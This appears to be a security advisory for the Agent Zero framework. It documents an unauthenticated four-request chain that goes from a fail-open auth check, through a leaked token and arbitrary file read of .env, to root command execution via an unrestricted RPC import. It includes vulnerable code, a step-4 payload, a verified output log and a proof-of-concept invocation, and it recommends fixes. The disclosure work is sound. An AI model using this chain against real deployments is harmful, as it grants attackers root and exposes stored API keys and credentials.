# Agent Zero: unauthenticated remote code execution

## Summary

In its default deployment — no `AUTH_LOGIN` configured — Agent Zero takes an anonymous
HTTP client to `root` in four requests.

| Step | Request | Credential required | Why it passes |
|---|---|---|---|
| 1 | `GET /api/csrf_token` | none | `requires_auth` returns when there is no credential hash |
| 2 | `POST /api/settings_get` | none (+ CSRF from step 1) | same; `mcp_server_token` is not in the masking list |
| 3 | `POST /api/api_files_get` | token from step 2 | that token *is* the API key; no path allowlist |
| 4 | `POST /api/rfc` | **none at all** | only an HMAC keyed on `RFC_PASSWORD`, which step 3 reads out of `.env` |

Step 4 is what makes this RCE rather than file disclosure: after the HMAC verifies, the
server calls `importlib.import_module(module)` and `getattr(imp, function_name)` with no
module or function allowlist. `subprocess.getoutput` is a legitimate attribute.

Verified end to end. `id` returns `uid=0(root)` with zero authentication headers sent.

## Affected versions

Agent Zero, vendor Agent Zero, repository https://github.com/agent0ai/agent-zero.

Verified against `main` at 2026-11-05. The condition depends on deployment, not release:
any instance started without `AUTH_LOGIN` is affected, and none of the three startup
scripts (`docker/run/fs/exe/initialize.sh`, `docker/run/fs/exe/run_A0.sh`,
`docker/base/fs/ins/after_install.sh`) set it.

## Vulnerability type

CWE-306 (Missing Authentication for Critical Function),
CWE-200 (Exposure of Sensitive Information),
CWE-78 (OS Command Injection).

CVSS v3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8 Critical.

## The four links

### 1. Authentication fails open (`helpers/api.py:175-187`)

```python
def requires_auth(f):
    @wraps(f)
    async def decorated(*args, **kwargs):
        from helpers import login
        user_pass_hash = login.get_credentials_hash()
        if not user_pass_hash:
            return await f(*args, **kwargs)          # no credentials: allow
        if session.get("authentication") != user_pass_hash:
            return redirect(...)
        return await f(*args, **kwargs)
```

`helpers/login.py:5-10` only consults `AUTH_LOGIN`:

```python
def get_credentials_hash():
    user = dotenv.get_dotenv_value(dotenv.KEY_AUTH_LOGIN)
    password = dotenv.get_dotenv_value(dotenv.KEY_AUTH_PASSWORD)
    if not user:
        return None
    return hashlib.sha256(f"{user}:{password}".encode()).hexdigest()
```

`helpers/api.py:264-274` shows the decorators are applied exactly as declared, so every
`requires_auth() == True` endpoint is anonymous in the default state.

`GET /api/csrf_token` is one of them. It also self-registers the caller's Origin: its
origin gate calls `initialize_allowed_origins()`, which appends the first non-localhost
Origin it ever sees to the persisted `ALLOWED_ORIGINS` and saves it to the env file. It
returns the CSRF token and `runtime_id`.

### 2. The settings endpoint leaks the API token (`helpers/settings.py:273-370`)

`convert_out` masks `api_keys`, `auth_password`, `rfc_password`, `root_password` and
`secrets`. But the output object is built at line 274 as
`SettingsOutput(settings=settings.copy(), ...)` — the whole dict is copied **before**
masking — and `mcp_server_token` is not in the masking list.

It is injected by `normalize_settings()` (`:494`) as `create_auth_token()`, which is
`sha256(f"{runtime_id}:{username}:{password}")[:16]` base64url encoded. Nothing to crack;
it is handed out.

### 3. The file endpoint opens any absolute path (`api/api_files_get.py`)

```python
else:
    external_path = path                       # caller's path, verbatim
if not os.path.exists(external_path):
    continue
with open(external_path, "rb") as f:           # no allowlist, no containment
    base64_content = base64.b64encode(f.read()).decode()
```

`helpers/files.py:576-584` neither normalizes nor constrains:

```python
def _resolve_path(*relative_paths):
    if len(relative_paths) == 1 and os.path.isabs(relative_paths[0]):
        return relative_paths[0]
    return os.path.join(_base_dir, *relative_paths)
```

Reading `.env` yields `RFC_PASSWORD` in cleartext.

### 4. The RPC endpoint runs any module attribute (`api/rfc.py`, `helpers/rfc.py:44-66`)

```python
class RFC(ApiHandler):
    @classmethod
    def requires_csrf(cls) -> bool: return False

    @classmethod
    def requires_auth(cls) -> bool: return False

    async def process(self, input, request):
        return await runtime.handle_rfc(input)
```

`requires_api_key` is **not overridden**, and the base default is `False`. This endpoint
asks for no credential of any kind.

```python
async def handle_rfc(rfc_call, password):
    if not crypto.verify_data(rfc_call["rfc_input"], rfc_call["hash"], password):
        raise Exception("Invalid RFC hash")
    input = json.loads(rfc_call["rfc_input"])
    return await _call_function(input["module"], input["function_name"], *input["args"], **input["kwargs"])

def _get_function(module: str, function_name: str):
    imp = importlib.import_module(module)      # any module
    func = getattr(imp, function_name)         # any attribute
    return func
```

No allowlist. `subprocess.getoutput` runs the string.

When `RFC_PASSWORD` is unset, `_get_rfc_password()` raises and this link fails closed. It
is the one place in the chain where the implementation chose correctly.

## Verified end-to-end output

Service built from upstream `main` @ 2026-11-05 using the original `register_api_route()`
and the original handlers. Only LLM / vector-store / secrets-extension imports were stubbed
so the module tree would load; none of the four verified paths is stubbed.

```
[1/4] GET  /api/csrf_token      -> csrf token + runtime_id
[2/4] POST /api/settings_get    -> mcp_server_token = WP6RL4AjQMd0z20H
[3/4] POST /api/api_files_get   -> .env: RFC_PASSWORD=rfc_secret_abc123
[4/4] POST /api/rfc             -> HTTP 200 "uid=0(root) gid=0(root) groups=0(root)\nzsh"
```

Body for step 4:

```json
{"rfc_input": "{\"module\":\"subprocess\",\"function_name\":\"getoutput\",\"args\":[\"id; hostname\"],\"kwargs\":{}}",
 "hash": "<HMAC-SHA256(rfc_input, RFC_PASSWORD)>"}
```

## Reproduction

```bash
./poc/exploit.sh http://TARGET:50001 /etc/passwd /a0/.env
```

Three arguments: base URL, a file to read, and the harness `.env` path (pass the third to
attempt step 4). The script walks all four links and prints the command output.

## Impact

Unauthenticated remote command execution as the process user — root in the shipped
container. Along the way the attacker also collects every provider API key and every
credential in `.env`.

## Fix

1. `requires_auth` must fail closed when no credential exists; force initial credential
   setup on first run. This one change closes links 1–3.
2. Add `mcp_server_token` to the `convert_out` masking list.
3. `api_files_get` needs an allowlist instead of a passthrough `else`;
   `_resolve_path` must normalize `..` and reject absolute inputs.
4. `/api/rfc` must require authentication, or be removed. Its docstring says "Secured by
   pre-shared key" — but the key is retrievable through link 3, so it secures nothing.
5. `helpers/rfc._get_function` needs a module and function allowlist.
6. `crypto.verify_data` should use `hmac.compare_digest`.

## Verification limits

- The service was assembled from `register_api_route()` plus the original handlers; it is
  not a full `run_ui.py` boot (`initialize` and the `helpers.secrets` extension were
  stubbed). The four verified paths are original code.
- `RFC_PASSWORD` was written into the test `.env` by hand. How common that variable is in
  real deployments was not measured, but it belongs to the product's own dev feature.
- No reverse proxy or gateway auth was in front.
